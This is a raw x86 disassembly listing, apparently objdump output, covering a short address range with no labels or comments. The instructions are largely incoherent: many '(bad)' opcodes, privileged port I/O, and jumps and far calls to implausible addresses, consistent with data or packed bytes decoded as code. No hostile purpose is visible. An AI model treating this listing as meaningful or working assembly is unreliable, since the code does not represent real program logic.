  4241bf:	and    dl,BYTE PTR [esi+0x74]
  4241c2:	fcos   
  4241c4:	jae    0x42421b
  4241c6:	hlt    
  4241c7:	mov    esi,0xbef46674
  4241cc:	or     edi,eax
  4241ce:	add    BYTE PTR [eax+eax*1],0x75
  4241d2:	test   al,0x3b
  4241d4:	cld    
  4241d5:	ins    BYTE PTR es:[edi],dx
  4241d6:	add    ah,bh
  4241d8:	add    esi,DWORD PTR [ebp+0x14]
  4241db:	mov    esi,0x2cc7a0ed
  4241e0:	fdiv   DWORD PTR [edi+0x4]
  4241e3:	jmp    0xab159beb
  4241e8:	aas    
  4241e9:	add    BYTE PTR [eax],al
  4241eb:	add    BYTE PTR [eax],al
  4241ed:	add    BYTE PTR [ecx],bh
  4241ef:	add    esp,edi
  4241f1:	add    esi,DWORD PTR [ebp-0x25]
  4241f4:	jg     0x4241b7
  4241f6:	mov    al,0xce
  4241f8:	inc    eax
  4241f9:	add    al,0x75
  4241fb:	add    cl,BYTE PTR [esi-0xc]
  4241fe:	aaa    
  4241ff:	inc    ebp
  424200:	pop    ebp
  424201:	mov    ds:0xece90275,al
  424206:	jbe    0x4241cf
  424208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424209:	xlat   BYTE PTR ds:[ebx]
  42420a:	loop   0x42420d
  42420c:	jmp    0x3a430c14
  424211:	out    dx,eax
  424212:	mov    dh,bl
  424214:	test   al,0x3
  424216:	repnz leave 
  424218:	pop    esi
  424219:	aas    
  42421a:	ins    DWORD PTR es:[edi],dx
  42421b:	or     DWORD PTR [ebx+0x68],ebp
  42421e:	je     0x424222
  424220:	jmp    0x63bd7f73
  424225:	ins    BYTE PTR es:[edi],dx
  424226:	je     0x42422a
  424228:	jmp    0x7c407249
  42422d:	push   ss
  42422e:	repnz mov esi,0x11989ce
  424234:	jmp    0x20b363c
  424239:	add    eax,0x275a0275
  42423e:	icebp  
  42423f:	stos   BYTE PTR es:[edi],al
  424240:	push   esp
  424241:	pop    es
  424242:	sbb    ebp,eax
  424244:	cmp    ecx,ebx
  424246:	pusha  
  424247:	retf   0x43f6
  42424a:	jne    0x4241e6
  42424c:	icebp  
  42424d:	dec    edi
  42424e:	pop    esp
  42424f:	adc    ebp,DWORD PTR [ecx+0x8a]
  424255:	add    BYTE PTR [eax],al
  424257:	neg    DWORD PTR [edx+0x0]
  42425a:	call   0x67cb44d5
  42425f:	ret    0x3
  424262:	jmp    0xe8aec356
  424267:	jbe    0x42426b
  424269:	xchg   DWORD PTR [ebp*1-0x7c9de81a],ebp
  424270:	cli    
  424271:	xchg   BYTE PTR [ebp*2+0x76118a7b],dh
  424278:	add    al,BYTE PTR [eax]
  42427a:	pusha  
  42427b:	or     al,0x67
  42427d:	add    ecx,ebp
  42427f:	jbe    0x4242fc
  424281:	adc    ch,0x77
  424284:	add    al,BYTE PTR [eax]
  424286:	jb     0x4242db
  424288:	(bad)  
  424289:	pop    edx
  42428a:	mov    dl,0x3f
  42428c:	lea    ecx,[eax]
  42428e:	jmp    0x992ec7e6
  424293:	inc    ecx
  424294:	xor    BYTE PTR [ebx+0x72],dl
  424297:	dec    ebx
  424298:	test   BYTE PTR [esi+0x1c9f739],0xeb
  42429f:	jbe    0x4242a3
  4242a1:	je     0x42429c
  4242a3:	test   ecx,0x276eb03
  4242a9:	je     0x42428c
  4242ab:	test   ecx,0x276eb04
  4242b1:	jne    0x424250
  4242b3:	dec    eax
  4242b4:	int3   
  4242b5:	cli    
  4242b6:	je     0x424336
  4242b8:	leave  
  4242b9:	adc    eax,0x19
  4242be:	add    BYTE PTR [eax],al
  4242c0:	call   0x9a15:0xde62000d
  4242c7:	pop    ecx
  4242c8:	jo     0x4242cc
  4242ca:	add    BYTE PTR [ebp+0x6a],dl
  4242cd:	stc    
  4242ce:	mov    dl,0x24
  4242d0:	cmp    DWORD PTR [esi+0x45],0x646449cd
  4242d7:	add    BYTE PTR [ebx+0x5e6abf7c],al
  4242dd:	(bad)  
  4242de:	loopne 0x4242f0
  4242e0:	push   edi
  4242e1:	(bad)  
  4242e2:	push   eax
  4242e3:	push   ebx
  4242e4:	mov    dh,0x27
  4242e6:	div    DWORD PTR [ebp+0x64]
  4242e9:	mov    ah,0x15
  4242eb:	fs dec ecx
  4242ed:	inc    ecx
  4242ee:	add    BYTE PTR [ebp-0x7cebcde4],al
  4242f4:	jno    0x4242a0
  4242f6:	cli    
  4242f7:	push   cs
  4242f8:	enter  0xcf,0x0
  4242fc:	sbb    al,0x80
  4242fe:	jge    0x4242fc
  424300:	sbb    BYTE PTR [esp+eax*4],al
  424303:	prefetch BYTE PTR [ecx]
  424306:	add    BYTE PTR [ecx+0x135f2],cl
  42430c:	sbb    al,0x4
  42430e:	scas   eax,DWORD PTR es:[edi]
  42430f:	pop    ebp
  424310:	or     al,0x4
  424312:	scas   eax,DWORD PTR es:[edi]
  424313:	(bad)  
  424314:	xchg   edi,eax
  424315:	jmp    0x424302
  424317:	adc    ecx,esp
  424319:	add    cl,al
  42431b:	loopne 0x4242e9
  42431d:	idiv   DWORD PTR [edx+0x833a350]
  424323:	mov    DWORD PTR [eax],eax
  424325:	add    BYTE PTR [eax],al
  424327:	add    BYTE PTR [eax],al
  424329:	icebp  
  42432a:	mov    ah,0x62
  42432c:	and    BYTE PTR [ebx-0x7400f7cd],dl
  424332:	sub    al,0x7b
  424334:	jge    0x424302
  424336:	add    eax,0xf62375
  42433b:	sub    al,al
  42433d:	inc    edi
  42433e:	(bad)  
  42433f:	call   0x488a39
  424344:	jmp    FWORD PTR [ecx]
  424346:	aad    0x6
  424348:	mov    bh,0x4c
  42434a:	push   ss
  42434b:	div    DWORD PTR [ebp-0x68]
  42434e:	mov    bl,0x75
  424350:	or     BYTE PTR [ecx+eiz*2-0x4b8a000a],ah
  424357:	das    
  424358:	jmp    0x421e1c
  42435d:	jp     0x42436c
  42435f:	cld    
  424360:	cli    
  424361:	call   0x6b972b37
  424366:	xchg   ebp,eax
  424367:	ror    BYTE PTR [ecx-0x8814e48],cl
  42436d:	ins    DWORD PTR es:[edi],dx
  42436e:	aam    0x82
  424370:	adc    DWORD PTR [ecx+ebx*8-0x1],esi
  424374:	or     dh,cl
  424376:	xchg   bh,bh
  424378:	push   DWORD PTR [ebp+0x58]
  42437b:	(bad)  
  42437c:	(bad)  
  42437d:	imul   ebx,DWORD PTR [ebp-0x6f],0x0
  424381:	jne    0x42435c
  424383:	jle    0x42437c
  424385:	jbe    0x424354
  424387:	dec    edx
  424388:	jg     0x4243a8
  42438a:	out    0x4b,eax
  42438c:	push   ebp
  42438d:	add    BYTE PTR [eax],al
  42438f:	add    BYTE PTR [eax],al
  424391:	add    al,ch
  424393:	nop
  424394:	fnstcw WORD PTR [edi+0xc]
  424397:	fisttp DWORD PTR [edx+0x44]
  42439a:	dec    eax
  42439b:	jp     0x42439c
  42439d:	push   DWORD PTR [ebp-0x4b]
  4243a0:	and    al,0x3d
  4243a2:	xlat   BYTE PTR ds:[ebx]
  4243a3:	fcos   
  4243a5:	jmp    FWORD PTR [ecx-0x2d]
  4243a8:	sbb    BYTE PTR [edi+0x73ffd975],bl
  4243ae:	xchg   edx,eax
  4243af:	ficomp WORD PTR [edi+0x4bd97500]
  4243b5:	sub    BYTE PTR [eax+0x75ffff46],dl
  4243bb:	outs   dx,BYTE PTR ds:[esi]
  4243bc:	pop    ebx
  4243bd:	jmp    0x421de4
  4243c2:	out    dx,al
  4243c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243c4:	pop    es
  4243c5:	data16 je 0x424437
  4243c8:	jmp    DWORD PTR [ebp+0x75]
  4243cb:	push   0xb5a915d2
  4243d0:	aas    
  4243d1:	add    BYTE PTR [ebp+0x2],al
  4243d4:	sar    DWORD PTR [ebx],1
  4243d6:	xchg   ecx,eax
  4243d7:	retf   
  4243d8:	fimul  DWORD PTR [ecx+0x375dea30]
  4243de:	or     ebx,0xd92a2454
  4243e4:	cmp    al,0xd5
  4243e6:	outs   dx,BYTE PTR ds:[esi]
  4243e7:	retf   
  4243e8:	cld    
  4243e9:	mov    ds:0x4ee90275,al
  4243ee:	ins    BYTE PTR es:[edi],dx
  4243ef:	pop    eax
  4243f0:	jmp    0x1c0da25e
  4243f5:	or     al,0x0
  4243f7:	add    BYTE PTR [eax],al
  4243f9:	add    BYTE PTR [eax],al
  4243fb:	pop    edx
  4243fc:	and    eax,0x275a3dc
  424401:	jmp    0xe99aa654
  424406:	imul   edi,DWORD PTR [edi],0x121793d7
  42440c:	add    ch,cl
  42440e:	add    esp,DWORD PTR [eax+0x256430ed]
  424414:	add    ch,cl
  424416:	aam    0xa0
  424418:	and    dh,dl
  42441a:	mov    WORD PTR ds:0x75f1d132,?
  424420:	add    ch,cl
  424422:	aam    0x88
  424424:	cli    
  424425:	dec    ecx
  424426:	lods   eax,DWORD PTR ds:[esi]
  424427:	sahf   
  424428:	sub    al,0x9e
  42442a:	retf   0xee33
  42442d:	call   0xe9445448
  424432:	add    ebp,DWORD PTR [esi-0x7a]
  424435:	cmp    eax,DWORD PTR [esi*2+0x75a2e402]
  42443c:	add    ch,cl
  42443e:	call   0x4885137
  424443:	jne    0x424447
  424445:	xchg   ebp,eax
  424446:	jbe    0x4244c0
  424448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424449:	jmp    0x653db951
  42444e:	scas   eax,DWORD PTR es:[edi]
  42444f:	jne    0x424453
  424451:	add    cl,ch
  424453:	mov    esp,DWORD PTR [ecx+0x5576e900]
  424459:	retf   0x4b72
  42445c:	cli    
  42445d:	gs call 0x424463
  424463:	add    BYTE PTR [ecx+0x79431054],ah
  424469:	cmp    edi,ebx
  42446b:	hlt    
  42446c:	stos   BYTE PTR es:[edi],al
  42446d:	cmc    
  42446e:	aas    
  42446f:	jmp    0xc3061f1a
  424474:	inc    ecx
  424475:	into   
  424476:	out    0x7c,eax
  424478:	mov    ebp,DWORD PTR [eax+0x0]
  42447b:	jmp    0xe6c741f6
  424480:	sub    esi,ecx
  424482:	sti    
  424483:	jb     0x424410
  424485:	div    dl
  424487:	sub    DWORD PTR [ebp+0x76eb0002],edx
  42448d:	dec    esi
  42448e:	call   0x1de9:0xd25641
  424495:	test   DWORD PTR [edi+0x72],edi
  424498:	outs   dx,DWORD PTR ds:[esi]
  424499:	dec    esi
  42449a:	cmp    bl,dh
  42449c:	lock cmp edi,ebx
  42449f:	sub    WORD PTR [edx-0x9],cx
  4244a3:	clc    
  4244a4:	mov    al,ds:0x12527f98
  4244a9:	push   esi
  4244aa:	sbb    ch,BYTE PTR [edx+0x1d]
  4244ad:	lock or ch,BYTE PTR [eax+eax*4-0x33]
  4244b2:	sti    
  4244b3:	sub    DWORD PTR ds:[eax+0x0],0xffffffe9
  4244b8:	jbe    0x4244b7
  4244ba:	test   dl,ch
  4244bc:	ror    ebp,0xfb
  4244bf:	popa   
  4244c0:	not    bl
  4244c2:	add    cl,ch
  4244c4:	fistp  QWORD PTR [ecx]
  4244c6:	sti    
  4244c7:	push   ss
  4244c8:	add    BYTE PTR [eax],al
  4244ca:	add    BYTE PTR [eax],al
  4244cc:	add    BYTE PTR [ecx+0x76e99e07],ch
  4244d2:	add    cl,BYTE PTR [ebx]
  4244d4:	add    BYTE PTR [ecx],ah
  4244d6:	fcomip st,st(6)
  4244d8:	jmp    FWORD PTR [ebx-0x5400c925]
  4244de:	mov    ch,0xb9
  4244e0:	dec    DWORD PTR [ebx-0x1c2fffc]
  4244e6:	(bad)  
  4244e7:	(bad)  
  4244e8:	jmp    DWORD PTR [ecx]
  4244ea:	out    0x82,eax
  4244ec:	inc    ebp
  4244ed:	cwde   
  4244ee:	dec    eax
  4244ef:	inc    eax
  4244f0:	and    al,0xf5
  4244f2:	(bad)  
  4244f3:	inc    DWORD PTR [eax]
  4244f5:	pop    esp
  4244f6:	add    al,0x84
  4244f8:	aaa    
  4244f9:	sub    esi,DWORD PTR [ebp+0x54c25f7]
  4244ff:	add    BYTE PTR [ecx],al
  424501:	and    edx,DWORD PTR [esi-0x4abe3fed]
  424507:	add    BYTE PTR [eax],al
  424509:	pop    esp
  42450a:	cli    
  42450b:	das    
  42450c:	lock dec esp
  42450e:	add    eax,0xa90cb707
  424513:	or     eax,0xfffec13d
  424518:	call   FWORD PTR [ebx]
  42451a:	jp     0x424530
  42451c:	jmp    FWORD PTR [ebx+0x72c183b5]
  424522:	jnp    0x4244e4
  424524:	push   fs
  424526:	(bad)  
  424527:	idiv   bh
  424529:	stos   DWORD PTR es:[edi],eax
  42452a:	pop    esp
  42452b:	xor    eax,ecx
  42452d:	sbb    edi,DWORD PTR [edx-0x19]
  424530:	inc    BYTE PTR [eax]
  424532:	add    BYTE PTR [eax],al
  424534:	add    BYTE PTR [eax],al
  424536:	stos   DWORD PTR es:[edi],eax
  424537:	mov    ch,0xf7
  424539:	jne    0x4245b7
  42453b:	mov    ch,0x75
  42453d:	or     dh,al
  42453f:	aaa    
  424540:	jmp    0xf7f7f033
  424545:	push   ebp
  424546:	push   edi
  424547:	loop   0x4245c4
  424549:	in     al,dx
  42454a:	mov    eax,0x6c8b4e0f
  42454f:	dec    ecx
  424550:	adc    BYTE PTR ds:[ebp-0x78],dh
  424554:	adc    bh,bl
  424556:	in     al,dx
  424557:	jne    0x42452c
  424559:	bound  ebp,QWORD PTR [ebx+eax*2-0xc]
  42455d:	add    BYTE PTR [ebp-0x25],dh
  424560:	push   ebx
  424561:	es stos DWORD PTR es:[edi],eax
  424563:	xchg   ebp,eax
  424564:	test   DWORD PTR [eax],0x457aaa21
  42456a:	gs push esp
  42456c:	inc    eax
  42456d:	or     al,0xfe
  42456f:	nop
  424570:	xlat   BYTE PTR ds:[ebx]
  424571:	aas    
  424572:	jle    0x424523
  424574:	into   
  424575:	jg     0x424587
  424577:	jecxz  0x42454a
  424579:	repnz mov eax,0x9a7403d1
  42457f:	xor    eax,DWORD PTR ds:0xaaccca53
  424585:	call   0xfc10d9a4
  42458a:	pop    esi
  42458b:	mov    esp,0xda7d807a
  424590:	(bad)  
  424591:	(bad)  
  424592:	in     al,dx
  424593:	push   ss
  424594:	fdiv   DWORD PTR [edi]
  424596:	xor    ch,bh
  424598:	or     BYTE PTR [ecx+0x0],cl
  42459e:	add    BYTE PTR [eax-0x3def258b],dh
  4245a4:	mov    edi,DWORD PTR [edi-0x617dcc79]
  4245aa:	test   al,0x75
  4245ac:	fsin   
  4245ae:	mov    dl,0x35
  4245b0:	push   ebx
  4245b1:	dec    eax
  4245b2:	in     al,0xfe
  4245b4:	lahf   
  4245b5:	out    dx,eax
  4245b6:	xchg   BYTE PTR [eax+0x6d5d7add],dh
  4245bc:	bound  esi,QWORD PTR [edi+0x0]
  4245bf:	je     0x42459a
  4245c1:	inc    DWORD PTR [esi+0x4d7aa933]
  4245c7:	test   DWORD PTR [edx+0x77],esp
  4245ca:	add    al,0x74
  4245cc:	fcos   
  4245ce:	ss mov dl,0x2
  4245d1:	xacquire xchg DWORD PTR [edi+0x4],ecx
  4245d5:	jmp    0x196831dd
  4245da:	xchg   BYTE PTR [eax-0x2e],dl
  4245dd:	out    0x57,eax
  4245df:	jns    0x42463d
  4245e1:	call   0x2712bdc4
  4245e6:	pop    es
  4245e7:	sub    esp,edi
  4245e9:	cdq    
  4245ea:	xchg   ebx,eax
  4245eb:	je     0x424668
  4245ed:	sbb    ebx,ebx
  4245ef:	sbb    ebx,DWORD PTR [edx+0x25fc03e9]
  4245f5:	int    0x85
  4245f7:	sbb    dh,dl
  4245f9:	or     DWORD PTR [eax+0x71],ebx
  4245fc:	pop    esp
  4245fd:	call   0xa712bdde
  424602:	inc    esp
  424603:	add    BYTE PTR [eax],al
  424605:	add    BYTE PTR [eax],al
  424607:	add    cl,ah
  424609:	cld    
  42460a:	adc    DWORD PTR [ecx+edi*2-0x50235c85],edx
  424611:	call   0x8591:0x24fc03e9
  424618:	rcr    dl,1
  42461a:	icebp  
  42461b:	push   edi
  42461c:	jns    0x42467a
  42461e:	call   0xa712bdff
  424623:	hlt    
  424624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424625:	cld    
  424626:	sbb    DWORD PTR [ebx+ebp*1+0x53dcab7c],edx
  42462d:	call   0xd0d9:0x3ff203e9
  424634:	vmovntdq YMMWORD PTR [ebx],ymm0
  424638:	jne    0x4246af
  42463a:	mov    ah,0xcb
  42463c:	(bad)  
  42463d:	xchg   ecx,eax
  42463e:	jmp    0xbf44bb45
  424643:	addr16 dec esp
  424645:	fimul  DWORD PTR [eax+0x7e]
  424648:	out    dx,al
  424649:	(bad)  
  42464a:	outs   dx,BYTE PTR ds:[esi]
  42464b:	int3   
  42464c:	cli    
  42464d:	cmp    al,0x0
  42464f:	xor    eax,esi
  424651:	shl    edx,0x60
  424654:	inc    edx
  424655:	(bad)  
  424656:	jg     0x424679
  424658:	jl     0x4246ad
  42465a:	xor    al,0x93
  42465c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42465d:	xor    bh,bl
  42465f:	cld    
  424660:	mov    edx,0xfe93fed
  424665:	add    al,BYTE PTR [eax]
  424667:	jmp    0x406694a2
  42466c:	add    BYTE PTR [eax],al
  42466e:	add    BYTE PTR [eax],al
  424670:	add    BYTE PTR [ecx+0x2],bh
  424673:	shr    cl,0x19
  424676:	mov    dl,0x1f
  424678:	sbb    BYTE PTR [eax-0x10018b4f],al
  42467e:	add    DWORD PTR [eax],eax
  424680:	in     eax,0xf6
  424682:	dec    esp
  424683:	adc    BYTE PTR [esi],bh
  424685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424686:	in     al,dx
  424687:	out    dx,eax
  424688:	cli    
  424689:	mov    dh,0x2
  42468b:	test   DWORD PTR [ecx+0x2488ffc2],ebp
  424691:	inc    ebp
  424692:	jle    0x42468c
  424694:	ins    BYTE PTR es:[edi],dx
  424695:	inc    ebp
  424696:	dec    edi
  424697:	sub    eax,0xa3f33116
  42469c:	jmp    0x1582e117
  4246a1:	cwde   
  4246a2:	or     eax,0xefa29d7d
  4246a7:	gs jmp 0x7d58101a
  4246ad:	and    al,BYTE PTR [esi]
  4246af:	add    BYTE PTR [ebx],dl
  4246b1:	jbe    0x42470f
  4246b3:	add    BYTE PTR [ecx],bl
  4246b5:	cwde   
  4246b6:	test   eax,0xca3f4fe8
  4246bb:	sti    
  4246bc:	cs mov bl,0xca
  4246bf:	add    ecx,ebp
  4246c1:	jbe    0x4246c5
  4246c3:	out    0xad,eax
  4246c5:	jns    0x4246ee
  4246c7:	hlt    
  4246c8:	and    DWORD PTR fs:[edi+0x3d],ecx
  4246cc:	add    BYTE PTR [edi],cl
  4246ce:	mov    bl,0x15
  4246d0:	loopne 0x42469a
  4246d2:	inc    ecx
  4246d3:	add    BYTE PTR [ebp+0x0],al
  4246d9:	add    BYTE PTR [ebp+ebp*1+0x2da3851c],cl
  4246e0:	add    bh,BYTE PTR [ebx]
  4246e2:	xor    ebp,DWORD PTR ds:0xde19f5fe
  4246e8:	push   DWORD PTR [ebx-0x2e]
  4246eb:	dec    eax
  4246ec:	pop    ebp
  4246ed:	cld    
  4246ee:	pop    ebx
  4246ef:	cmp    al,0xf8
  4246f1:	add    DWORD PTR [ecx+eax*1-0x59887500],ebx
  4246f8:	push   cs
  4246f9:	and    DWORD PTR [ecx],0x9c8000c9
  4246ff:	add    DWORD PTR [ebp+ecx*1+0x26],esi
  424703:	jmp    DWORD PTR [ecx+0x0]
  424706:	es (bad) 
  424708:	sub    bl,bl
  42470a:	mov    ah,0xf
  42470c:	stc    
  42470d:	inc    DWORD PTR [ebx+0x7b]
  424710:	test   DWORD PTR [edi],0x105d8
  424716:	dec    esp
  424717:	add    BYTE PTR [ebp-0x58],0x7c
  42471b:	or     eax,0xf1f445bf
  424720:	(bad)  
  424721:	call   FWORD PTR [esp+esi*4+0x15]
  424725:	hlt    
  424726:	aas    
  424727:	inc    ecx
  424728:	add    BYTE PTR [ebp+0x357fc50c],al
  42472e:	sbb    eax,0x6b0f0001
  424733:	adc    edx,DWORD PTR [eax]
  424735:	packssdw mm7,QWORD PTR [ebx]
  424738:	or     al,0xc1
  42473a:	out    dx,eax
  42473b:	int    0x2
  42473d:	fadd   DWORD PTR [eax]
  42473f:	add    BYTE PTR [eax],al
  424741:	add    BYTE PTR [eax],al
  424743:	lahf   
  424744:	xor    edi,eax
  424746:	add    DWORD PTR [ecx],ebp
  424748:	sbb    al,0x4f
  42474a:	call   0x42e775
  42474f:	jne    0x4246d4
  424751:	and    al,0x74
  424753:	jns    0x4247b5
  424755:	(bad)  
  424756:	out    0x89,eax
  424758:	push   eax
  424759:	dec    ecx
  42475a:	adc    BYTE PTR [esi+0x220bbf9e],cl
  424760:	adc    esi,DWORD PTR [edi+0x45]
  424763:	add    DWORD PTR [eax],0xf3b4bc49
  424769:	repz or cl,BYTE PTR [edx]
  42476c:	sbb    esi,edi
  42476e:	test   esi,0x7d7d76d7
  424774:	pop    eax
  424775:	push   ecx
  424776:	lock jne 0x4247c0
  424779:	std    
  42477a:	dec    esi
  42477b:	dec    edx
  42477c:	jae    0x424722
  42477e:	add    BYTE PTR [ebp-0x25],dh
  424781:	push   edi
  424782:	add    DWORD PTR [edi-0x25],esi
  424785:	jmp    esi
  424787:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  424789:	dec    eax
  42478a:	or     BYTE PTR [ecx+0x2f],bh
  42478d:	icebp  
  42478e:	dec    esi
  42478f:	and    al,BYTE PTR [ebx-0x62]
  424792:	add    BYTE PTR [ebp-0x27],dh
  424795:	push   edi
  424796:	(bad)  
  424797:	je     0x424772
  424799:	(bad)  
  42479a:	cli    
  42479b:	call   0xd87c861
  4247a0:	jmp    0xe8c5:0x615175ca
  4247a7:	add    BYTE PTR [eax],al
  4247a9:	add    BYTE PTR [eax],al
  4247ab:	add    BYTE PTR [edi-0x9043560],bl
  4247b1:	out    0xdf,al
  4247b3:	add    cl,al
  4247b5:	fld    TBYTE PTR [esi]
  4247b7:	push   ebx
  4247b8:	popf   
  4247b9:	cmp    al,0xff
  4247bb:	push   DWORD PTR [ebp-0xf]
  4247be:	add    bh,dh
  4247c0:	and    bl,dl
  4247c2:	(bad)  
  4247c3:	push   cs
  4247c4:	and    edx,DWORD PTR [edi]
  4247c6:	cld    
  4247c7:	aas    
  4247c8:	mov    DWORD PTR [esi+0x29d532e],esi
  4247ce:	xchg   ecx,eax
  4247cf:	add    esi,DWORD PTR [ebp+0x2]
  4247d2:	sar    ebx,1
  4247d4:	clc    
  4247d5:	ret    
  4247d6:	jmp    0x5d0cb0a9
  4247db:	dec    eax
  4247dc:	sbb    eax,0xe1584233
  4247e1:	ja     0x424806
  4247e3:	fcmovne st,st(2)
  4247e5:	enter  0xce32,0x52
  4247e9:	inc    ebp
  4247ea:	inc    ecx
  4247eb:	add    eax,DWORD PTR [ecx-0xc]
  4247ee:	mov    ch,0x36
  4247f0:	dec    ebp
  4247f1:	sahf   
  4247f2:	jmp    0xed9cbcfa
  4247f7:	add    DWORD PTR [ebp+0x2],esi
  4247fa:	(bad)  
  4247fb:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247fd:	cmp    eax,0xe526f3f1
  424802:	xchg   ebp,eax
  424803:	ss or  eax,0x7503e99d
  424809:	pop    edx
  42480a:	in     al,0x1
  42480c:	jne    0x424810
  42480e:	loop   0x424867
  424810:	add    BYTE PTR [eax],al
  424812:	add    BYTE PTR [eax],al
  424814:	add    BYTE PTR [ebp+0x75],bh
  424817:	and    al,0x9c
  424819:	and    eax,0xfad05cc3
  42481e:	mov    ebx,0xc36390c1
  424823:	ret    0xb8d6
  424826:	cli    
  424827:	out    0x57,eax
  424829:	js     0x42485a
  42482b:	sbb    bl,BYTE PTR [ebp+edx*1+0x2]
  42482f:	jmp    0xe7452537
  424834:	add    esi,DWORD PTR [ebp-0x3d]
  424837:	adc    al,0xcc
  424839:	call   0x2e76897a
  42483e:	dec    ebp
  42483f:	lea    edi,[ecx+0x37]
  424842:	fisub  DWORD PTR [eax-0x36]
  424845:	push   ds
  424846:	ret    
  424847:	jb     0x424890
  424849:	ins    DWORD PTR es:[edi],dx
  42484a:	add    al,BYTE PTR [eax]
  42484c:	loope  0x4248c4
  42484e:	add    dh,BYTE PTR [esi+eax*8-0x54]
  424852:	add    ch,BYTE PTR [esi]
  424854:	sub    DWORD PTR [eax+edi*4-0x18],edi
  424858:	add    eax,0xe60001d3
  42485d:	or     DWORD PTR ds:0xc201de14,esi
  424863:	dec    edi
  424864:	sub    dh,dl
  424866:	icebp  
  424867:	push   es
  424868:	xor    DWORD PTR [esi+0x76eb065a],esp
  42486e:	add    bh,bl
  424870:	mov    ah,0xba
  424872:	(bad)  
  424873:	adc    eax,0x2c415
  424878:	mov    esi,0x0
  42487d:	add    BYTE PTR [eax-0x56d436d5],cl
  424883:	ret    0xe4f5
  424886:	push   esi
  424887:	test   al,0x3f
  424889:	jmp    0x11619708
  42488e:	and    edi,DWORD PTR [edi-0x3e051700]
  424894:	je     0x424869
  424896:	or     eax,0x35c527f5
  42489b:	add    cl,BYTE PTR [ebx]
  42489d:	xchg   esi,eax
  42489e:	idiv   ebp
  4248a0:	add    cl,ch
  4248a2:	jbe    0x4248b1
  4248a4:	mov    bl,0x60
  4248a6:	jbe    0x4248ab
  4248a8:	add    cl,ch
  4248aa:	aaa    
  4248ab:	mov    ds:0x8237f210,eax
  4248b0:	sti    
  4248b1:	or     al,0x29
  4248b3:	pop    ss
  4248b4:	inc    eax
  4248b5:	jmp    0xc76250da
  4248ba:	mov    ch,0x2
  4248bc:	add    al,0x15
  4248be:	imul   ebp,DWORD PTR [edx+0x276ae64],0xedc2a984
  4248c8:	xchg   BYTE PTR [eax],al
  4248ca:	push   eax
  4248cb:	jmp    0x8b1b:0x59cc8503
  4248d2:	sbb    DWORD PTR [esi],ebx
  4248d4:	fadd   QWORD PTR [ebx+0x1c]
  4248d7:	cmp    ecx,DWORD PTR [ecx+0x60d00]
  4248dd:	mov    DWORD PTR [ebx+edi*1],eax
  4248e0:	or     eax,0x28
  4248e5:	add    BYTE PTR [eax],al
  4248e7:	test   al,0x42
  4248e9:	add    BYTE PTR [ebx+0x10955],cl
  4248ef:	int3   
  4248f0:	cmp    al,0x48
  4248f2:	add    al,0xdf
  4248f4:	lds    eax,FWORD PTR [eax-0x3e]
  4248f7:	loopne 0x4248fe
  4248f9:	sub    eax,eax
  4248fb:	aaa    
  4248fc:	int3   
  4248fd:	mul    DWORD PTR ds:0x3bb938
  424903:	bound  ecx,QWORD PTR [eax]
  424905:	and    dh,bl
  424907:	fild   WORD PTR ds:0xddea7404
  42490d:	sbb    eax,0x84058cc7
  424912:	shl    BYTE PTR [eax],0xe8
  424915:	mov    al,ds:0x426828
  42491a:	mov    ebp,eax
  42491c:	jmp    0x646d224
  424921:	add    DWORD PTR [eax],eax
  424923:	mov    WORD PTR [eax+0x44],es
  424926:	and    al,0x54
  424928:	inc    eax
  424929:	or     eax,0x491828
  42492e:	mov    ebp,ecx
  424930:	add    al,BYTE PTR [ecx]
  424932:	add    BYTE PTR [eax+ebx*1-0x40],cl
  424936:	inc    eax
  424937:	push   ds
  424938:	mov    esi,0x671fefb
  42493d:	adc    al,0x40
  42493f:	dec    esp
  424940:	rol    DWORD PTR ds:0x48fa20,cl
  424946:	add    al,0x75
  424948:	cld    
  424949:	sub    eax,0x53
  42494e:	add    BYTE PTR [eax],al
  424950:	mov    eax,ds:0x3bdddbe6
  424955:	stos   DWORD PTR es:[edi],eax
  424956:	inc    DWORD PTR [ebx-0x78fc48cb]
  42495c:	mov    cl,0xcf
  42495e:	out    dx,eax
  42495f:	add    esi,DWORD PTR cs:[ecx+ebp*4+0x75]
  424964:	push   0x46523181
  424969:	inc    esp
  42496a:	xchg   BYTE PTR [eax],bl
  42496c:	shr    DWORD PTR [ebx-0x1],1
  42496f:	out    0x7a,eax
  424971:	pop    eax
  424972:	(bad)  
  424973:	sti    
  424974:	inc    edx
  424975:	imul   ebp,DWORD PTR [edx],0xc6ab71be
  42497b:	adc    eax,0x3fda75
  424980:	and    ebx,DWORD PTR [edx+edi*2-0x34423d08]
  424987:	adc    al,0x35
  424989:	stos   DWORD PTR es:[edi],eax
  42498a:	or     bh,al
  42498c:	sub    BYTE PTR [esi+0x4425231],ch
  424992:	scas   eax,DWORD PTR es:[edi]
  424993:	das    
  424994:	mov    ch,0x13
  424996:	test   eax,0xc6643b5b
  42499b:	and    eax,0x3fdb9d
  4249a0:	and    DWORD PTR [ebp-0x54c925e1],0xfffffffb
  4249a7:	jae    0x4249dd
  4249a9:	rol    DWORD PTR [ecx+0x7ba975c2],cl
  4249af:	shl    cl,0x11
  4249b2:	(bad)  
  4249b3:	adc    eax,0x0
  4249b8:	add    BYTE PTR [ebp-0x26],dh
  4249bb:	aas    
  4249bc:	add    dh,ch
  4249be:	scas   al,BYTE PTR es:[edi]
  4249bf:	pop    ss
  4249c0:	fdiv   QWORD PTR [esi+0x79810ca9]
  4249c6:	stos   BYTE PTR es:[edi],al
  4249c7:	(bad)  
  4249c8:	dec    eax
  4249ca:	add    al,BYTE PTR [eax]
  4249cc:	aaa    
  4249cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249ce:	repz test al,0x33
  4249d1:	lds    edx,FWORD PTR [edx-0x2a]
  4249d4:	scas   al,BYTE PTR es:[edi]
  4249d5:	out    dx,eax
  4249d6:	sbb    ch,BYTE PTR [ebp+0x4faa7546]
  4249dc:	rcr    DWORD PTR [esi],1
  4249de:	shl    BYTE PTR [esi+0xe42afc3],0xc7
  4249e5:	xchg   ebx,eax
  4249e6:	add    eax,0x1446f06a
